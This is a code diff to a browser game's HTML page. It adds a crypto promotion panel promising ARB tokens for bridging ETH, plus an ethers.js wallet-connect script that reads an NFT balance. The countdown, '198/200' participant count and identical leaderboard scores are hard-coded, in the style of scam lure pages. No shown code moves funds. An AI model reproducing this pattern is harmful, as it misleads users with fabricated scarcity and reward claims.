@@ -283,6 +283,122 @@
         width: 70%;
         margin: 0.1rem auto 0;
       }
+      .overview {
+        display: flex;
+      }
+      .overview .side-panel {
+        position: absolute;
+        height: 100%;
+        width: 30%;
+      }
+      /* .overview .side-panel-body {
+        position: fixed;
+        display: flex;
+        flex-direction: column;
+        background-color: white;
+        top: 30%;
+        width: 30%;
+        height: 65%;
+        left: 1%;
+        border-top-left-radius: 20px;
+        border-top-right-radius: 40px;
+        border-bottom-right-radius: 40px;
+        border-bottom-left-radius: 40px;
+      } */
+      .side-panel-body .side-panel-container {
+        position: fixed;
+        top: 30%;
+        width: 25%;
+        left: 1%;
+        height: 65%;
+        font-size: 15px;
+        border-top-left-radius: 20px;
+        border-top-right-radius: 40px;
+        border-bottom-right-radius: 40px;
+        border-bottom-left-radius: 40px;
+        background-color: white;
+        overflow: hidden;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      }
+
+      .side-panel-body .header {
+        padding: 20px;
+        color: #018a08;
+        text-align: start;
+        border-top-left-radius: 20px;
+        border-top-right-radius: 20px;
+        border-bottom: #27ae60 dashed 0.5px;
+      }
+
+      .side-panel-body .header p:nth-child(2) {
+        padding-top: 8px;
+      }
+
+      .side-panel-body .info {
+        display: flex;
+        justify-content: space-around;
+        padding: 10px;
+      }
+
+      .side-panel-body .info-item {
+        padding: 10px 20px;
+        border-radius: 5px;
+        background-color: #f9f9f9;
+        text-align: center;
+      }
+
+      .side-panel-body .info-item p:first-child {
+        text-align: start;
+        font-size: 10px;
+        color: grey;
+        padding-bottom: 2px;
+      }
+      .side-panel-body .info-item p:nth-child(2) {
+        text-align: start;
+        font-size: 20px;
+        color: #018a08;
+        padding-bottom: 2px;
+      }
+
+      .side-panel-body .leaderboard {
+        margin: 10px 30px;
+        border-radius: 5px;
+        font-size: 10px;
+        padding: 10px 20px;
+        text-align: center;
+        background-color: #f9f9f9;
+        overflow: scroll;
+        max-height: 180px;
+      }
+
+      .side-panel-body .leaderboard-header,
+      .leaderboard-entry {
+        display: flex;
+        justify-content: space-between;
+        padding: 10px 0;
+        border-bottom: 1px solid #e0e0e0;
+      }
+
+      .side-panel-body .leaderboard-header {
+        font-weight: bold;
+      }
+
+      .side-panel-body .connect-button {
+        margin-left: 30px;
+        margin-right: 30px;
+        padding: 15px 60px;
+        background-color: #018a08;
+        color: white;
+        border: none;
+        border-radius: 20px;
+        cursor: pointer;
+        font-size: 16px;
+        margin-top: 30px;
+      }
+
+      .side-panel-body .connect-button:hover {
+        background-color: #27ae60;
+      }
       .wxShare {
         background: #000;
         position: absolute;
@@ -311,47 +427,109 @@
   </head>
   <body>
     <canvas id="canvas" class="hide"></canvas>
-    <div class="content">
-      <div class="loading">
-        <div class="main">
-          <img src="./assets/main-loading.gif" />
-          <div class="progress">
-            <div class="title font-wenxue">0%</div>
-            <div class="bar">
-              <div class="sub"><div class="percent"></div></div>
+    <div class="overview">
+      <div>
+        <img src="./assets/side-panel.png" class="side-panel" />
+        <div class="side-panel-body">
+          <div class="side-panel-container">
+            <div class="header">
+              <p>
+                Bridge any amount of ETH from Ethereum Mainnet to Arbitrum and
+                earn ARB tokens!
+              </p>
+              <p>Keep Pushing Higher↑</p>
             </div>
-            <div class="text">Loading...</div>
+            <div class="info">
+              <div class="info-item">
+                <p>Ends in</p>
+                <p>24h 39m 34s</p>
+              </div>
+              <div class="info-item">
+                <p>Participants</p>
+                <p>198/200</p>
+              </div>
+            </div>
+            <div class="leaderboard">
+              <p>Leaderboard</p>
+              <div class="leaderboard-header">
+                <span>#</span>
+                <span>Player Address</span>
+                <span>Score</span>
+              </div>
+              <div class="leaderboard-entry">
+                <span>01</span>
+                <span>zoraman.eth</span>
+                <span>23564</span>
+              </div>
+              <div class="leaderboard-entry">
+                <span>02</span>
+                <span>fitnesscryptoguru.eth</span>
+                <span>23564</span>
+              </div>
+              <div class="leaderboard-entry">
+                <span>03</span>
+                <span>sithame.eth</span>
+                <span>23564</span>
+              </div>
+              <div class="leaderboard-entry">
+                <span>04</span>
+                <span>0xf1cA...dDEa</span>
+                <span>23564</span>
+              </div>
+              <div class="leaderboard-entry">
+                <span>05</span>
+                <span>0x356E...f21D</span>
+                <span>23564</span>
+              </div>
+            </div>
+            <button id="connect-wallet" class="connect-button">
+              Connect Wallet to play
+            </button>
           </div>
         </div>
       </div>
-      <div class="landing hide">
-        <div class="action-1">
-          <img src="./assets/main-index-title.png" class="title swing" />
-        </div>
-        <div class="action-2">
-          <img id="start" src="./assets/main-index-start.png" class="start" />
-        </div>
-      </div>
-      <div id="modal" class="modal hide">
-        <div class="mask"></div>
-        <div class="js-modal-content modal-content">
+      <div class="content">
+        <div class="loading">
           <div class="main">
-            <div class="container">
-              <img src="./assets/main-modal-bg.png" class="bg" />
-              <div class="modal-main">
-                <div id="over-modal" class="hide js-modal-card">
-                  <img src="./assets/main-modal-over.png" class="over-img" />
-                  <div id="score" class="over-score font-wenxue"></div>
-                  <div id="over-zero" class="hide">
-                    <div class="tip">
-                      <p>Try Again!</p>
-                      <img
-                        src="./assets/main-modal-again-b.png"
-                        class="over-button-b js-reload"
-                      /><img
-                        src="./assets/main-modal-invite-b.png"
-                        class="over-button-b js-invite"
-                      />
+            <img src="./assets/main-loading.gif" />
+            <div class="progress">
+              <div class="title font-wenxue">0%</div>
+              <div class="bar">
+                <div class="sub"><div class="percent"></div></div>
+              </div>
+              <div class="text">Loading...</div>
+            </div>
+          </div>
+        </div>
+        <div class="landing hide">
+          <div class="action-1">
+            <img src="./assets/main-index-title.png" class="title swing hook" />
+          </div>
+          <div class="action-2">
+            <img id="start" src="./assets/main-index-start.png" class="start" />
+          </div>
+        </div>
+        <div id="modal" class="modal hide">
+          <div class="mask"></div>
+          <div class="js-modal-content modal-content">
+            <div class="main">
+              <div class="container">
+                <img src="./assets/main-modal-bg.png" class="bg" />
+                <div class="modal-main">
+                  <div id="over-modal" class="hide js-modal-card">
+                    <img src="./assets/main-modal-over.png" class="over-img" />
+                    <div id="score" class="over-score font-wenxue"></div>
+                    <div id="over-zero" class="hide">
+                      <div class="tip">
+                        <p>Try Again!</p>
+                        <img
+                          src="./assets/main-modal-again-b.png"
+                          class="over-button-b js-reload"
+                        /><img
+                          src="./assets/main-modal-invite-b.png"
+                          class="over-button-b js-invite"
+                        />
+                      </div>
                     </div>
                   </div>
                 </div>
@@ -359,8 +537,10 @@
             </div>
           </div>
         </div>
+        <div class="wxShare hide">
+          <img src="./assets/main-share-icon.png" />
+        </div>
       </div>
-      <div class="wxShare hide"><img src="./assets/main-share-icon.png" /></div>
     </div>
     <script src="./dist/main.js"></script>
     <script src="./assets/zepto-1.1.6.min.js"></script>
@@ -512,6 +692,745 @@
       (window.dataLayer = window.dataLayer || []),
         gtag("js", new Date()),
         gtag("config", "G-YCWZ8ZDCH2");
+    </script>
+    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
+    <script>
+      // Import ethers.js
+
+      // Ethereum provider (MetaMask)
+
+      // NFT Contract details (replace with actual contract address and ABI)
+      const contractAddress = "0x47ade447c2b2769e29533bd80e5d7cca089333a2";
+      const contractABI = [
+        {
+          inputs: [
+            {
+              internalType: "address",
+              name: "to",
+              type: "address",
+            },
+            {
+              internalType: "uint256",
+              name: "tokenId",
+              type: "uint256",
+            },
+          ],
+          name: "approve",
+          outputs: [],
+          stateMutability: "nonpayable",
+          type: "function",
+        },
+        {
+          inputs: [
+            {
+              internalType: "uint256",
+              name: "tokenId",
+              type: "uint256",
+            },
+          ],
+          name: "burn",
+          outputs: [],
+          stateMutability: "nonpayable",
+          type: "function",
+        },
+        {
+          inputs: [
+            {
+              internalType: "address",
+              name: "initialOwner",
+              type: "address",
+            },
+          ],
+          stateMutability: "nonpayable",
+          type: "constructor",
+        },
+        {
+          inputs: [
+            {
+              internalType: "address",
+              name: "sender",
+              type: "address",
+            },
+            {
+              internalType: "uint256",
+              name: "tokenId",
+              type: "uint256",
+            },
+            {
+              internalType: "address",
+              name: "owner",
+              type: "address",
+            },
+          ],
+          name: "ERC721IncorrectOwner",
+          type: "error",
+        },
+        {
+          inputs: [
+            {
+              internalType: "address",
+              name: "operator",
+              type: "address",
+            },
+            {
+              internalType: "uint256",
+              name: "tokenId",
+              type: "uint256",
+            },
+          ],
+          name: "ERC721InsufficientApproval",
+          type: "error",
+        },
+        {
+          inputs: [
+            {
+              internalType: "address",
+              name: "approver",
+              type: "address",
+            },
+          ],
+          name: "ERC721InvalidApprover",
+          type: "error",
+        },
+        {
+          inputs: [
+            {
+              internalType: "address",
+              name: "operator",
+              type: "address",
+            },
+          ],
+          name: "ERC721InvalidOperator",
+          type: "error",
+        },
+        {
+          inputs: [
+            {
+              internalType: "address",
+              name: "owner",
+              type: "address",
+            },
+          ],
+          name: "ERC721InvalidOwner",
+          type: "error",
+        },
+        {
+          inputs: [
+            {
+              internalType: "address",
+              name: "receiver",
+              type: "address",
+            },
+          ],
+          name: "ERC721InvalidReceiver",
+          type: "error",
+        },
+        {
+          inputs: [
+            {
+              internalType: "address",
+              name: "sender",
+              type: "address",
+            },
+          ],
+          name: "ERC721InvalidSender",
+          type: "error",
+        },
+        {
+          inputs: [
+            {
+              internalType: "uint256",
+              name: "tokenId",
+              type: "uint256",
+            },
+          ],
+          name: "ERC721NonexistentToken",
+          type: "error",
+        },
+        {
+          inputs: [
+            {
+              internalType: "address",
+              name: "owner",
+              type: "address",
+            },
+          ],
+          name: "OwnableInvalidOwner",
+          type: "error",
+        },
+        {
+          inputs: [
+            {
+              internalType: "address",
+              name: "account",
+              type: "address",
+            },
+          ],
+          name: "OwnableUnauthorizedAccount",
+          type: "error",
+        },
+        {
+          anonymous: false,
+          inputs: [
+            {
+              indexed: true,
+              internalType: "address",
+              name: "owner",
+              type: "address",
+            },
+            {
+              indexed: true,
+              internalType: "address",
+              name: "approved",
+              type: "address",
+            },
+            {
+              indexed: true,
+              internalType: "uint256",
+              name: "tokenId",
+              type: "uint256",
+            },
+          ],
+          name: "Approval",
+          type: "event",
+        },
+        {
+          anonymous: false,
+          inputs: [
+            {
+              indexed: true,
+              internalType: "address",
+              name: "owner",
+              type: "address",
+            },
+            {
+              indexed: true,
+              internalType: "address",
+              name: "operator",
+              type: "address",
+            },
+            {
+              indexed: false,
+              internalType: "bool",
+              name: "approved",
+              type: "bool",
+            },
+          ],
+          name: "ApprovalForAll",
+          type: "event",
+        },
+        {
+          anonymous: false,
+          inputs: [
+            {
+              indexed: false,
+              internalType: "uint256",
+              name: "_fromTokenId",
+              type: "uint256",
+            },
+            {
+              indexed: false,
+              internalType: "uint256",
+              name: "_toTokenId",
+              type: "uint256",
+            },
+          ],
+          name: "BatchMetadataUpdate",
+          type: "event",
+        },
+        {
+          anonymous: false,
+          inputs: [
+            {
+              indexed: false,
+              internalType: "uint256",
+              name: "_tokenId",
+              type: "uint256",
+            },
+          ],
+          name: "MetadataUpdate",
+          type: "event",
+        },
+        {
+          anonymous: false,
+          inputs: [
+            {
+              indexed: true,
+              internalType: "address",
+              name: "previousOwner",
+              type: "address",
+            },
+            {
+              indexed: true,
+              internalType: "address",
+              name: "newOwner",
+              type: "address",
+            },
+          ],
+          name: "OwnershipTransferred",
+          type: "event",
+        },
+        {
+          inputs: [],
+          name: "renounceOwnership",
+          outputs: [],
+          stateMutability: "nonpayable",
+          type: "function",
+        },
+        {
+          inputs: [
+            {
+              internalType: "address",
+              name: "to",
+              type: "address",
+            },
+            {
+              internalType: "uint256",
+              name: "tokenId",
+              type: "uint256",
+            },
+            {
+              internalType: "string",
+              name: "uri",
+              type: "string",
+            },
+          ],
+          name: "safeMint",
+          outputs: [],
+          stateMutability: "payable",
+          type: "function",
+        },
+        {
+          inputs: [
+            {
+              internalType: "address",
+              name: "from",
+              type: "address",
+            },
+            {
+              internalType: "address",
+              name: "to",
+              type: "address",
+            },
+            {
+              internalType: "uint256",
+              name: "tokenId",
+              type: "uint256",
+            },
+          ],
+          name: "safeTransferFrom",
+          outputs: [],
+          stateMutability: "nonpayable",
+          type: "function",
+        },
+        {
+          inputs: [
+            {
+              internalType: "address",
+              name: "from",
+              type: "address",
+            },
+            {
+              internalType: "address",
+              name: "to",
+              type: "address",
+            },
+            {
+              internalType: "uint256",
+              name: "tokenId",
+              type: "uint256",
+            },
+            {
+              internalType: "bytes",
+              name: "data",
+              type: "bytes",
+            },
+          ],
+          name: "safeTransferFrom",
+          outputs: [],
+          stateMutability: "nonpayable",
+          type: "function",
+        },
+        {
+          inputs: [
+            {
+              internalType: "address",
+              name: "operator",
+              type: "address",
+            },
+            {
+              internalType: "bool",
+              name: "approved",
+              type: "bool",
+            },
+          ],
+          name: "setApprovalForAll",
+          outputs: [],
+          stateMutability: "nonpayable",
+          type: "function",
+        },
+        {
+          anonymous: false,
+          inputs: [
+            {
+              indexed: true,
+              internalType: "address",
+              name: "from",
+              type: "address",
+            },
+            {
+              indexed: true,
+              internalType: "address",
+              name: "to",
+              type: "address",
+            },
+            {
+              indexed: true,
+              internalType: "uint256",
+              name: "tokenId",
+              type: "uint256",
+            },
+          ],
+          name: "Transfer",
+          type: "event",
+        },
+        {
+          inputs: [
+            {
+              internalType: "address",
+              name: "from",
+              type: "address",
+            },
+            {
+              internalType: "address",
+              name: "to",
+              type: "address",
+            },
+            {
+              internalType: "uint256",
+              name: "tokenId",
+              type: "uint256",
+            },
+          ],
+          name: "transferFrom",
+          outputs: [],
+          stateMutability: "nonpayable",
+          type: "function",
+        },
+        {
+          inputs: [
+            {
+              internalType: "address",
+              name: "newOwner",
+              type: "address",
+            },
+          ],
+          name: "transferOwnership",
+          outputs: [],
+          stateMutability: "nonpayable",
+          type: "function",
+        },
+        {
+          inputs: [
+            {
+              internalType: "address",
+              name: "owner",
+              type: "address",
+            },
+          ],
+          name: "balanceOf",
+          outputs: [
+            {
+              internalType: "uint256",
+              name: "",
+              type: "uint256",
+            },
+          ],
+          stateMutability: "view",
+          type: "function",
+        },
+        {
+          inputs: [
+            {
+              internalType: "uint256",
+              name: "tokenId",
+              type: "uint256",
+            },
+          ],
+          name: "getApproved",
+          outputs: [
+            {
+              internalType: "address",
+              name: "",
+              type: "address",
+            },
+          ],
+          stateMutability: "view",
+          type: "function",
+        },
+        {
+          inputs: [
+            {
+              internalType: "address",
+              name: "owner",
+              type: "address",
+            },
+            {
+              internalType: "address",
+              name: "operator",
+              type: "address",
+            },
+          ],
+          name: "isApprovedForAll",
+          outputs: [
+            {
+              internalType: "bool",
+              name: "",
+              type: "bool",
+            },
+          ],
+          stateMutability: "view",
+          type: "function",
+        },
+        {
+          inputs: [],
+          name: "maxSupply",
+          outputs: [
+            {
+              internalType: "uint256",
+              name: "",
+              type: "uint256",
+            },
+          ],
+          stateMutability: "view",
+          type: "function",
+        },
+        {
+          inputs: [],
+          name: "mintPrice",
+          outputs: [
+            {
+              internalType: "uint256",
+              name: "",
+              type: "uint256",
+            },
+          ],
+          stateMutability: "view",
+          type: "function",
+        },
+        {
+          inputs: [],
+          name: "name",
+          outputs: [
+            {
+              internalType: "string",
+              name: "",
+              type: "string",
+            },
+          ],
+          stateMutability: "view",
+          type: "function",
+        },
+        {
+          inputs: [],
+          name: "owner",
+          outputs: [
+            {
+              internalType: "address",
+              name: "",
+              type: "address",
+            },
+          ],
+          stateMutability: "view",
+          type: "function",
+        },
+        {
+          inputs: [
+            {
+              internalType: "uint256",
+              name: "tokenId",
+              type: "uint256",
+            },
+          ],
+          name: "ownerOf",
+          outputs: [
+            {
+              internalType: "address",
+              name: "",
+              type: "address",
+            },
+          ],
+          stateMutability: "view",
+          type: "function",
+        },
+        {
+          inputs: [
+            {
+              internalType: "bytes4",
+              name: "interfaceId",
+              type: "bytes4",
+            },
+          ],
+          name: "supportsInterface",
+          outputs: [
+            {
+              internalType: "bool",
+              name: "",
+              type: "bool",
+            },
+          ],
+          stateMutability: "view",
+          type: "function",
+        },
+        {
+          inputs: [],
+          name: "symbol",
+          outputs: [
+            {
+              internalType: "string",
+              name: "",
+              type: "string",
+            },
+          ],
+          stateMutability: "view",
+          type: "function",
+        },
+        {
+          inputs: [
+            {
+              internalType: "uint256",
+              name: "tokenId",
+              type: "uint256",
+            },
+          ],
+          name: "tokenURI",
+          outputs: [
+            {
+              internalType: "string",
+              name: "",
+              type: "string",
+            },
+          ],
+          stateMutability: "view",
+          type: "function",
+        },
+        {
+          inputs: [],
+          name: "totalSupply",
+          outputs: [
+            {
+              internalType: "uint256",
+              name: "",
+              type: "uint256",
+            },
+          ],
+          stateMutability: "view",
+          type: "function",
+        },
+        {
+          inputs: [
+            {
+              internalType: "address",
+              name: "",
+              type: "address",
+            },
+          ],
+          name: "walletMints",
+          outputs: [
+            {
+              internalType: "uint256",
+              name: "",
+              type: "uint256",
+            },
+          ],
+          stateMutability: "view",
+          type: "function",
+        },
+      ];
+
+      let provider;
+
+      async function initializeProvider() {
+        provider = new ethers.providers.Web3Provider(window.ethereum, "any");
+      }
+
+      // Request accounts to connect wallet
+      async function connectWallet() {
+        try {
+          await provider.send("eth_requestAccounts", []);
+          const signer = provider.getSigner();
+          const address = await signer.getAddress();
+          return address;
+        } catch (error) {
+          console.error("Error connecting to wallet:", error);
+        }
+      }
+
+      // Function to check if NFT is present
+      async function checkNFT(address) {
+        const contract = new ethers.Contract(
+          contractAddress,
+          contractABI,
+          provider
+        );
+        try {
+          const balance = await contract.balanceOf(address);
+          const nftStatus = `Balance of NFTs for address ${address}: ${balance.toString()}`;
+          if (balance.gt(0)) {
+            console.log("NFT is present for the given address.");
+            return true;
+          } else {
+            console.log("No NFT found for the given address.");
+            return false;
+          }
+        } catch (error) {
+          console.error("Error checking NFT presence:", error);
+          return false;
+        }
+      }
+
+      // Main function to connect wallet and check NFT
+      async function main() {
+        const address = await connectWallet();
+        if (address) {
+          await checkNFT(address);
+        }
+      }
+
+      // Function to switch wallet
+      async function switchWallet() {
+        try {
+          // Disconnect current provider
+          provider = new ethers.providers.Web3Provider(window.ethereum, "any");
+          // Request MetaMask to connect to another wallet
+          await provider.send("wallet_requestPermissions", [
+            { eth_accounts: {} },
+          ]);
+          // Now run the main function to connect and check the new wallet
+          await main();
+        } catch (error) {
+          console.error("Error switching wallet:", error);
+        }
+      }
+
+      // Initialize the provider when the page loads
+      initializeProvider();
+
+      const switchWalletElement = document.getElementById("switchWalletButton");
+
+      document.addEventListener("DOMContentLoaded", function () {
+        document
+          .getElementById("connect-wallet")
+          .addEventListener("click", main);
+      });
+
+      if (switchWalletElement) {
+        document.addEventListener("DOMContentLoaded", function () {
+          document
+            .getElementById("switchWalletButton")
+            .addEventListener("click", switchWallet);
+        });
+      }
     </script>
   </body>
 </html>
